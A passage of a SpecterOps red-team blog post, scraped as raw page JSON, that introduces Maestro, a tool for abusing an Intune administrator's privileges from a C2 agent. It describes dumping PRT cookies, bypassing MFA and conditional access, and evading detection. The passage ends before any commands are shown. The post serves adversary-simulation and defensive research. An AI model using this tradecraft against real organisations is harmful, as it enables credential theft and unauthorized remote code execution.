":"https:\u002F\u002Fposts.specterops.io\u002Fazure-key-vault-tradecraft-with-bark-24163abc8de3","sequence":null,"uniqueSlug":"azure-key-vault-tradecraft-with-bark-24163abc8de3"},"LinkedAccounts:1cf7ed8b7054":{"__typename":"LinkedAccounts","mastodon":null,"id":"1cf7ed8b7054"},"UserViewerEdge:userId:1cf7ed8b7054-viewerId:lo_7f2bf6c42a29":{"__typename":"UserViewerEdge","id":"userId:1cf7ed8b7054-viewerId:lo_7f2bf6c42a29","isFollowing":false,"isUser":false,"isMuting":false},"NewsletterV3:b6dcb600f544":{"__typename":"NewsletterV3","id":"b6dcb600f544","type":"NEWSLETTER_TYPE_AUTHOR","slug":"1cf7ed8b7054","name":"1cf7ed8b7054","collection":null,"user":{"__ref":"User:1cf7ed8b7054"}},"User:1cf7ed8b7054":{"__typename":"User","id":"1cf7ed8b7054","name":"Chris Thompson","username":"Mayyhem","newsletterV3":{"__ref":"NewsletterV3:b6dcb600f544"},"linkedAccounts":{"__ref":"LinkedAccounts:1cf7ed8b7054"},"isSuspended":false,"imageId":"0*VB1kJkW5uCVpMaQ8","mediumMemberAt":0,"verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":135,"followingCount":4,"collectionFollowingCount":1},"customDomainState":null,"hasSubdomain":false,"bio":"Adversary Simulation @SpecterOps","isPartnerProgramEnrolled":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:1cf7ed8b7054-viewerId:lo_7f2bf6c42a29"},"viewerIsUser":false,"postSubscribeMembershipUpsellShownAt":0,"membership":null,"allowNotes":true,"twitterScreenName":""},"Paragraph:45f5bfae1934_0":{"__typename":"Paragraph","id":"45f5bfae1934_0","name":"ac65","type":"H3","href":null,"layout":null,"metadata":null,"text":"Maestro: Abusing Intune for Lateral Movement Over C2","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":52,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_1":{"__typename":"Paragraph","id":"45f5bfae1934_1","name":"1d7a","type":"P","href":null,"layout":null,"metadata":null,"text":"If I have a command and control (C2) agent on an Intune admin’s workstation, I should just be able to use their privileges to execute a script or application on an Intune-enrolled device, right?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_2":{"__typename":"Paragraph","id":"45f5bfae1934_2","name":"f24c","type":"P","href":null,"layout":null,"metadata":null,"text":"Not so fast.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_3":{"__typename":"Paragraph","id":"45f5bfae1934_3","name":"6339","type":"H3","href":null,"layout":null,"metadata":null,"text":"I Wanna Go Fast!","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_4":{"__typename":"Paragraph","id":"45f5bfae1934_4","name":"52ca","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Take me to the GitHub repo!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":27,"href":"https:\u002F\u002Fgithub.com\u002FMayyhem\u002FMaestro","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_5":{"__typename":"Paragraph","id":"45f5bfae1934_5","name":"7f47","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Take me to the attack path walkthrough!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":39,"href":"https:\u002F\u002Fposts.specterops.io\u002Fmaestro-9ed71d38d546#3530","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_6":{"__typename":"Paragraph","id":"45f5bfae1934_6","name":"fd7e","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Take me to the defensive guidance!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":34,"href":"https:\u002F\u002Fposts.specterops.io\u002Fmaestro-9ed71d38d546#66a5","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_7":{"__typename":"Paragraph","id":"45f5bfae1934_7","name":"cd71","type":"H3","href":null,"layout":null,"metadata":null,"text":"The Problem","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_8":{"__typename":"Paragraph","id":"45f5bfae1934_8","name":"523e","type":"P","href":null,"layout":null,"metadata":null,"text":"We often find ourselves in the context of a cloud administrator when following attack paths to objectives that require privileged access to Azure-hosted services. We want to use their Entra ID account’s privileges to execute actions in Azure, for example running arbitrary code on remote Intune devices (a.k.a. the “Death from Above” attack path detailed by Andy Robbins), but we have some hurdles to overcome to accomplish this from a C2 agent:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":311,"end":345,"href":"https:\u002F\u002Fposts.specterops.io\u002Fdeath-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":358,"end":370,"href":"https:\u002F\u002Fx.com\u002F_wald0","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_9":{"__typename":"Paragraph","id":"45f5bfae1934_9","name":"cf76","type":"ULI","href":null,"layout":null,"metadata":null,"text":"We don’t have the user’s cleartext password","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_10":{"__typename":"Paragraph","id":"45f5bfae1934_10","name":"82a8","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Conditional access policies (CAPs) require multi-factor authentication (MFA) for access to the Intune Portal and\u002For a compliant, hybrid-joined device on a trusted network","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_11":{"__typename":"Paragraph","id":"45f5bfae1934_11","name":"b625","type":"ULI","href":null,"layout":null,"metadata":null,"text":"We need to maintain stealth","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_12":{"__typename":"Paragraph","id":"45f5bfae1934_12","name":"b122","type":"ULI","href":null,"layout":null,"metadata":null,"text":"We don’t have the knowledge, time, or patience to manipulate tokens and navigate the Azure portal or multiple tools","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_13":{"__typename":"Paragraph","id":"45f5bfae1934_13","name":"5427","type":"P","href":null,"layout":null,"metadata":null,"text":"Let’s look at these problems one at a time and discuss the options available to us.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_14":{"__typename":"Paragraph","id":"45f5bfae1934_14","name":"e6cf","type":"P","href":null,"layout":null,"metadata":null,"text":"No Cleartext Credentials \u002F MFA Required","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":39,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_15":{"__typename":"Paragraph","id":"45f5bfae1934_15","name":"f322","type":"P","href":null,"layout":null,"metadata":null,"text":"No password? No problem. We already asked the admin nicely for their creds and they didn’t bite, and their password hygiene on the host is solid, but if the device has an identity in Entra ID, we can dump primary refresh token (PRT) cookies from the machine with tools like Lee Chagolla-Christensen’s RequestAADRefreshToken, Dirk-jan Mollema’s ROADToken, Evan McBroom’s LSA Whisperer, Daniel Heinsen’s, SharpGetEntraToken, or aad_prt_bof by wotwot563. These PRT cookies will even have an MFA claim if Windows Hello for Business (WHfB) was used for logon, allowing us to comply with MFA requirements enforced by CAPs or the new default security policy for Azure sign-in.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":36,"end":74,"href":"https:\u002F\u002Fgithub.com\u002Foutflanknl\u002FC2-Tool-Collection\u002Ftree\u002Fmain\u002FBOF\u002FAskcreds","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":205,"end":226,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fentra\u002Fidentity\u002Fdevices\u002Fconcept-primary-refresh-token","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":274,"end":298,"href":"https:\u002F\u002Fx.com\u002Ftifkin_","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":301,"end":323,"href":"https:\u002F\u002Fgithub.com\u002Fleechristensen\u002FRequestAADRefreshToken","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":325,"end":341,"href":"https:\u002F\u002Fx.com\u002F_dirkjan","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":344,"end":353,"href":"https:\u002F\u002Fgithub.com\u002Fdirkjanm\u002FROADtoken","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":355,"end":367,"href":"https:\u002F\u002Fx.com\u002Fmcbroom_evan","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":370,"end":383,"href":"https:\u002F\u002Fgithub.com\u002FEvanMcBroom\u002Flsa-whisperer","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":385,"end":399,"href":"https:\u002F\u002Fx.com\u002Fhotnops","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":403,"end":421,"href":"https:\u002F\u002Fgithub.com\u002Fhotnops\u002FSharpGetEntraToken","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":426,"end":437,"href":"https:\u002F\u002Fgithub.com\u002Fwotwot563\u002Faad_prt_bof","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":441,"end":450,"href":"https:\u002F\u002Fgithub.com\u002Fwotwot563","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":623,"end":668,"href":"https:\u002F\u002Fazure.microsoft.com\u002Fen-us\u002Fblog\u002Fannouncing-mandatory-multi-factor-authentication-for-azure-sign-in\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_16":{"__typename":"Paragraph","id":"45f5bfae1934_16","name":"369e","type":"P","href":null,"layout":null,"metadata":null,"text":"Stealth","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":7,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_17":{"__typename":"Paragraph","id":"45f5bfae1934_17","name":"6b01","type":"P","href":null,"layout":null,"metadata":null,"text":"We want to only execute tools that are code-signed and legitimately used in the environment, otherwise keep tool execution within our current process or proxied into the environment from a machine we control that isn’t subject to the organization’s security stack.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_18":{"__typename":"Paragraph","id":"45f5bfae1934_18","name":"2efc","type":"P","href":null,"layout":null,"metadata":null,"text":"We could use our shiny new PRT cookie to interact with Azure using a web browser proxied through the administrator’s workstation, but:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_19":{"__typename":"Paragraph","id":"45f5bfae1934_19","name":"46bf","type":"ULI","href":null,"layout":null,"metadata":null,"text":"fumbling through the portal requires prior experience or time to figure out, and features are added, removed, or moved all the time","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_20":{"__typename":"Paragraph","id":"45f5bfae1934_20","name":"71b8","type":"ULI","href":null,"layout":null,"metadata":null,"text":"information made available by the Azure APIs we’re interested in is not always displayed to the user or is difficult to find","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_21":{"__typename":"Paragraph","id":"45f5bfae1934_21","name":"a2e3","type":"ULI","href":null,"layout":null,"metadata":null,"text":"we have to take frequent screenshots and manual activity logs for deconfliction and reporting instead of letting our C2 framework handle all that, gross","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_22":{"__typename":"Paragraph","id":"45f5bfae1934_22","name":"6d0a","type":"ULI","href":null,"layout":null,"metadata":null,"text":"we may still hit CAPs preventing access without a compliant and\u002For hybrid-joined device","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_23":{"__typename":"Paragraph","id":"45f5bfae1934_23","name":"0ffa","type":"P","href":null,"layout":null,"metadata":null,"text":"We could use our C2 agent to run command line tools that are likely to be already installed on cloud administrator workstations (e.g., PowerShell’s Invoke-RestMethod, Microsoft.Graph, AzureAD, or Intune modules, curl.exe, etc.) and interact with Azure APIs, but they don’t directly support BYO PRT cookies, they require multiple steps to obtain refresh and access tokens after dumping a PRT cookie (let alone execute actions with those tokens), and they may generate suspicious parent\u002Fchild process relationships and command line arguments.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":167,"end":182,"href":"https:\u002F\u002Fgithub.com\u002Fmicrosoft\u002Fmggraph-intune-samples","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":184,"end":191,"href":"https:\u002F\u002Fwww.powershellgallery.com\u002Fpackages\u002Fazuread\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":196,"end":202,"href":"https:\u002F\u002Fgithub.com\u002Fmicrosoft\u002FIntune-PowerShell-SDK","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_24":{"__typename":"Paragraph","id":"45f5bfae1934_24","name":"c012","type":"P","href":null,"layout":null,"metadata":null,"text":"We could dump refresh or access tokens from the memory of applications the cloud admin has used to authenticate to Entra ID (e.g., their browser, the ConfigMgr console in co-management setups, etc.) with tools like the office_tokens BOF from TrustedSec, but we need some luck to obtain creds with the correct client ID, scope, and resource for the actions we want to take or that can be swapped for creds that meet these requirements.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":219,"end":236,"href":"https:\u002F\u002Fgithub.com\u002Ftrustedsec\u002FCS-Remote-OPs-BOF","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":387,"end":404,"href":"https:\u002F\u002Fgithub.com\u002Fsecureworks\u002Ffamily-of-client-ids-research","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_25":{"__typename":"Paragraph","id":"45f5bfae1934_25","name":"4ce5","type":"P","href":null,"layout":null,"metadata":null,"text":"Device Compliance \u002F Hybrid-joined Device","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":40,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_26":{"__typename":"Paragraph","id":"45f5bfae1934_26","name":"9629","type":"P","href":null,"layout":null,"metadata":null,"text":"An appropriately scoped refresh or access token would enable us to proxy in excellent open-source tools like ROADTools, AADInternals, BARK, AzureHound, TokenTactics\u002FTokenTacticsV2, or GraphRunner, but we still may be blocked by CAPs requiring device compliance or a hybrid-joined device when exchanging refresh tokens for access tokens or by Continuous Access Evaluation when trying to use stolen access tokens. Further, we need a solid understanding of token manipulation, which at least for me was confusing and not easy to learn without a lot of help, trial and error, and training from Dirk-jan Mollema at Outsider Security.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":109,"end":118,"href":"https:\u002F\u002Fgithub.com\u002Fdirkjanm\u002FROADtools","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":120,"end":132,"href":"https:\u002F\u002Fgithub.com\u002FGerenios\u002FAADInternals","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":134,"end":138,"href":"https:\u002F\u002Fgithub.com\u002FBloodHoundAD\u002FBARK","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":140,"end":150,"href":"https:\u002F\u002Fgithub.com\u002FBloodHoundAD\u002FAzureHound","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":152,"end":164,"href":"https:\u002F\u002Fgithub.com\u002Frvrsh3ll\u002FTokenTactics","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":165,"end":179,"href":"https:\u002F\u002Fgithub.com\u002Ff-bader\u002FTokenTacticsV2","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":184,"end":195,"href":"https:\u002F\u002Fgithub.com\u002Fdafthack\u002FGraphRunner","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":342,"end":370,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fentra\u002Fidentity\u002Fconditional-access\u002Fconcept-continuous-access-evaluation","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":576,"end":584,"href":"https:\u002F\u002Foutsidersecurity.nl\u002Ftraining\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_27":{"__typename":"Paragraph","id":"45f5bfae1934_27","name":"5002","type":"P","href":null,"layout":null,"metadata":null,"text":"While it’s possible to fake device compliance with AADInternals thanks to Dr. Nestori Syynimaa (@DrAzureAD) and just a few days ago, Dirk-jan Mollema posted a screenshot of a fake device he created that satisfied ten device compliance requirements, these techniques are not guaranteed to work in all organizations. Device compliance may also be determined and reported to Intune by Microsoft Configuration Manager (formerly SCCM) if the device is co-managed, complicating this attack vector further.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":23,"end":63,"href":"https:\u002F\u002Faadinternals.com\u002Fpost\u002Fmdm\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":96,"end":106,"href":"https:\u002F\u002Fx.com\u002FDrAzureAD","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":150,"end":186,"href":"https:\u002F\u002Fx.com\u002F_dirkjan\u002Fstatus\u002F1850891976322781482","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_28":{"__typename":"Paragraph","id":"45f5bfae1934_28","name":"6fb3","type":"P","href":null,"layout":null,"metadata":null,"text":"It’s also possible to satisfy conditional access policies requiring a hybrid-joined\u002Fregistered device by joining a rogue\u002Ffake device to Entra ID or by overwriting an existing one, but these techniques require credentials to execute and don’t necessarily allow us to enroll the device in Intune to achieve device compliance.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_29":{"__typename":"Paragraph","id":"45f5bfae1934_29","name":"2ab8","type":"P","href":null,"layout":null,"metadata":null,"text":"In any case, CAPs may prevent us from proxying in the tools needed to pull off these attacks or from using them off network, and executing PowerShell directly on the admin’s workstation is risky. I’d rather just use the Intune admin’s compliant hybrid-joined device to reach my objectives.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_30":{"__typename":"Paragraph","id":"45f5bfae1934_30","name":"1973","type":"P","href":null,"layout":null,"metadata":null,"text":"Using the Azure Portal and Other Tools","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":38,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_31":{"__typename":"Paragraph","id":"45f5bfae1934_31","name":"f21c","type":"P","href":null,"layout":null,"metadata":null,"text":"Let’s say the problems above are all figured out or we luck out and stumble upon an access token with exactly the attributes we need and there are no CAPs preventing us from using it. We still need to figure out how to use the token to make the appropriate calls to the Microsoft Graph API to execute scripts, applications, and queries on Intune-enrolled devices, which is a complicated, multi-step process.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_32":{"__typename":"Paragraph","id":"45f5bfae1934_32","name":"2b3f","type":"H3","href":null,"layout":null,"metadata":null,"text":"The Solution","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_33":{"__typename":"Paragraph","id":"45f5bfae1934_33","name":"e915","type":"P","href":null,"layout":null,"metadata":null,"text":"These problems kept resurfacing and none of the available options were ideal for my use case, so I decided to write Maestro to automate them away.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Q0HvFPk-PaFefT-lIZpQVw.png":{"__typename":"ImageMetadata","id":"1*Q0HvFPk-PaFefT-lIZpQVw.png","originalHeight":340,"originalWidth":340,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_34":{"__typename":"Paragraph","id":"45f5bfae1934_34","name":"30fc","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Q0HvFPk-PaFefT-lIZpQVw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_35":{"__typename":"Paragraph","id":"45f5bfae1934_35","name":"ce09","type":"P","href":null,"layout":null,"metadata":null,"text":"Maestro, an open-source tool sponsored by SpecterOps, was first released at DEF CON 2024 Demo Labs. You can find the code here. If compiling from source, make sure you use the Release build (or the copy on GitHub, if you trust me 😉) so that all of Maestro’s dependencies are merged into the standalone executable with dnMerge by Ceri Coburn (@_ethicalchaos_).","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":42,"end":52,"href":"https:\u002F\u002Fspecterops.io\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":76,"end":98,"href":"https:\u002F\u002Fdocs.google.com\u002Fpresentation\u002Fd\u002F1TGl-ASNo-1jXMOha9yd1CdPI-zCMt2UP\u002Fedit?usp=sharing&ouid=114582824289521319309&rtpof=true&sd=true","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":122,"end":126,"href":"https:\u002F\u002Fgithub.com\u002FMayyhem\u002FMaestro","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":319,"end":326,"href":"https:\u002F\u002Fgithub.com\u002FCCob\u002FdnMerge","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":343,"end":358,"href":"https:\u002F\u002Fx.com\u002F_ethicalchaos_","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_36":{"__typename":"Paragraph","id":"45f5bfae1934_36","name":"9024","type":"P","href":null,"layout":null,"metadata":null,"text":"Maestro is essentially a wrapper for local PRT cookie requests and calls to the Microsoft Graph API with a lot of quality-of-life features added for red teamers. It allows you to execute apps, scripts, and device query on Intune-enrolled devices from a C2 agent on an admin’s workstation, no password or proxy required. Data can be optionally stored in a LiteDB database that Maestro will check for valid tokens when subsequent commands are executed.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":206,"end":218,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fmem\u002Fanalytics\u002Fdevice-query","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_37":{"__typename":"Paragraph","id":"45f5bfae1934_37","name":"670e","type":"P","href":null,"layout":null,"metadata":null,"text":"Maestro takes care of acquiring all the necessary tokens and making the right HTTP requests to execute the action you’re attempting to take in the context of an Intune administrator. Specifically, Maestro mimics the way Edge obtains a nonce from Azure and a signed PRT cookie from the local TPM, then signs in to Intune with the authorization code OAuth flow and obtains an appropriately scoped access token for the requested resource from the mysterious DelegationToken endpoint.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":455,"end":479,"href":"https:\u002F\u002Fgithub.com\u002FAzure\u002Fportaldocs\u002Fblob\u002Fmain\u002Fportal-sdk\u002Fgenerated\u002Ftop-extensions-authentication-flow.md","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*3yGXQfW7b7nIfI1q":{"__typename":"ImageMetadata","id":"0*3yGXQfW7b7nIfI1q","originalHeight":1125,"originalWidth":1338,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_38":{"__typename":"Paragraph","id":"45f5bfae1934_38","name":"21c7","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*3yGXQfW7b7nIfI1q"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_39":{"__typename":"Paragraph","id":"45f5bfae1934_39","name":"3530","type":"H3","href":null,"layout":null,"metadata":null,"text":"Executing the “Death from Above” Attack Path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_40":{"__typename":"Paragraph","id":"45f5bfae1934_40","name":"0392","type":"P","href":null,"layout":null,"metadata":null,"text":"Let’s walk through how to execute scripts, applications, and device query on Intune devices with Maestro using the Mythic C2 framework by Cody Thomas (@its_a_feature_) and the SpecterOps Apollo Mythic C2 agent for inline assembly execution. Note that Apollo is a C2 agent we use in our training offerings and it was designed without stealth as a primary concern, so it will likely be detected in a real-world environment.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":151,"end":166,"href":"https:\u002F\u002Fx.com\u002Fits_a_feature_","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":187,"end":193,"href":"https:\u002F\u002Fgithub.com\u002FMythicAgents\u002FApollo","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":282,"end":304,"href":"https:\u002F\u002Fspecterops.io\u002Ftraining\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_41":{"__typename":"Paragraph","id":"45f5bfae1934_41","name":"cf4c","type":"P","href":null,"layout":null,"metadata":null,"text":"If something goes wrong, keep in mind that you can run any Maestro command with the `-h` flag to display its full usage.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*cECCV24NZckb1gBr":{"__typename":"ImageMetadata","id":"0*cECCV24NZckb1gBr","originalHeight":754,"originalWidth":1365,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_42":{"__typename":"Paragraph","id":"45f5bfae1934_42","name":"6111","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:0*cECCV24NZckb1gBr"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_43":{"__typename":"Paragraph","id":"45f5bfae1934_43","name":"2c37","type":"P","href":null,"layout":null,"metadata":null,"text":"Let’s say our objective is to gain access to a code repository that only Chris Thompson has access to, and we suspect that there is credential material in their home directory, so we’d like to move laterally to their workstation.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_44":{"__typename":"Paragraph","id":"45f5bfae1934_44","name":"d78e","type":"P","href":null,"layout":null,"metadata":null,"text":"Recon \u002F Locating 